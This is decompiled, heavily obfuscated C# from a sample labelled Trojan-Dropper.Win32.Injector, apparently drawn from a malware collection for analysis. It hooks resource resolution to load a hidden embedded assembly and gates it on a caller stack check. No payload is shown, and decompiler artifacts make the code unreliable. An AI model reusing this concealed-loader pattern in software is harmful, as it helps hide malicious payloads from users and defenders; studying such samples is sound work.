// Decompiled with JetBrains decompiler
// Type: .
// Assembly: file, Version=11.0.0.0, Culture=neutral, PublicKeyToken=71f2cf7c2509b8fe
// MVID: 1F473243-1123-401F-8099-7648B7C34C41
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Injector.deqx-3dcf304237ebec8756d9362ccf0259126c1c62ff5c0b09096876be2cdc64ae5a.exe

using \u0001;
using \u0008;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0001
{
  internal class \u0007
  {
    private static Assembly \u0001;
    private static string[] \u0001;

    internal static void \u0002()
    {
      try
      {
        try
        {
          AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u0007.\u0002);
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex)
      {
        \u0004.\u0002(ex);
        throw;
      }
    }

    private static Assembly \u0002([In] object obj0, [In] ResolveEventArgs obj1)
    {
      string[] strArray1;
      int index;
      string str;
      try
      {
        if ((object) \u0007.\u0001 == null)
        {
          string[] strArray2 = \u0007.\u0001;
          if (true)
            goto label_21;
label_2:
          Monitor.Enter((object) strArray2);
          try
          {
            \u0007.\u0001 = Assembly.Load("{f5309fe4-5b90-457a-8f92-fb0a7efdb494}, PublicKeyToken=3e56350693f7355e");
            if ((object) \u0007.\u0001 != null)
            {
              \u0007.\u0001 = \u0007.\u0001.GetManifestResourceNames();
              goto label_6;
            }
            else
              goto label_6;
          }
          finally
          {
            Monitor.Exit((object) strArray1);
          }
label_21:
          strArray1 = strArray2;
          goto label_2;
        }
label_6:
        string name = obj1.Name;
        if (true)
          goto label_22;
label_7:
        if (true)
          goto label_23;
label_17:
        while (true)
        {
          int num1;
          do
          {
            int num2 = index;
            int num3 = \u0007.\u0001.Length;
            if (true)
              goto label_18;
label_9:
            if (num3 != 0)
            {
              if (num3 != 0)
              {
                if (num2 == 0)
                  num2 = index;
                else
                  goto label_12;
              }
              num1 = num2 + 1;
              continue;
            }
            goto label_19;
label_18:
            num3 = num3;
label_19:
            if (num2 < num3)
            {
              int num4 = \u0007.\u0001[index] == str ? 1 : 0;
              num3 = 7;
              num2 = num4;
              goto label_9;
            }
            else
              goto label_20;
          }
          while (false);
          index = num1;
        }
label_12:
        return !\u0007.\u0002() ? (Assembly) null : \u0007.\u0001;
label_20:
        return (Assembly) null;
label_23:
        index = 0;
        goto label_17;
label_22:
        str = name;
        goto label_7;
      }
      catch (Exception ex)
      {
        string o1 = str;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) index;
        string[] o3 = strArray1;
        object o4 = obj0;
        ResolveEventArgs o5 = obj1;
        \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, o4, (object) o5);
        throw;
      }
    }

    private static bool \u0002()
    {
      StackFrame[] stackFrameArray;
      int index;
      StackFrame stackFrame1;
      try
      {
        bool flag;
        try
        {
          if (true)
          {
            StackFrame[] frames = new StackTrace().GetFrames();
            if (true)
              goto label_13;
label_2:
            if (true)
              goto label_14;
label_9:
            int num1;
            while (true)
            {
              int num2;
              do
              {
                num2 = index;
                while (true)
                {
                  if (true)
                  {
                    int length = stackFrameArray.Length;
                    if (num2 < length)
                    {
                      StackFrame stackFrame2 = stackFrameArray[index];
                      if (true)
                        goto label_15;
label_4:
                      if ((object) stackFrame1.GetMethod().Module.Assembly == (object) Assembly.GetExecutingAssembly())
                      {
                        num1 = 1;
                        if (num1 == 0)
                        {
                          num2 = num1;
                          continue;
                        }
                        goto label_6;
                      }
                      else
                        break;
label_15:
                      stackFrame1 = stackFrame2;
                      goto label_4;
                    }
                    else
                      goto label_12;
                  }
                  else
                    goto label_8;
                }
                num2 = index + 1;
label_8:;
              }
              while (false);
              index = num2;
            }
label_6:
            if (true)
            {
              flag = num1 != 0;
              goto label_20;
            }
            else
              goto label_20;
label_12:
            flag = false;
            goto label_20;
label_14:
            index = 2;
            goto label_9;
label_13:
            stackFrameArray = frames;
            goto label_2;
          }
        }
        catch
        {
          if (true)
            flag = true;
        }
label_20:
        return flag;
      }
      catch (Exception ex)
      {
        StackFrame[] o1 = stackFrameArray;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) index;
        StackFrame o3 = stackFrame1;
        bool flag;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o4 = (ValueType) flag;
        \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    public \u0007()
    {
      try
      {
      }
      catch (Exception ex)
      {
        \u0004.\u0002(ex, (object) this);
        throw;
      }
    }

    static \u0007()
    {
      try
      {
        \u0007.\u0001 = (Assembly) null;
        \u0007.\u0001 = new string[0];
      }
      catch (Exception ex)
      {
        \u0004.\u0002(ex);
        throw;
      }
    }
  }
}
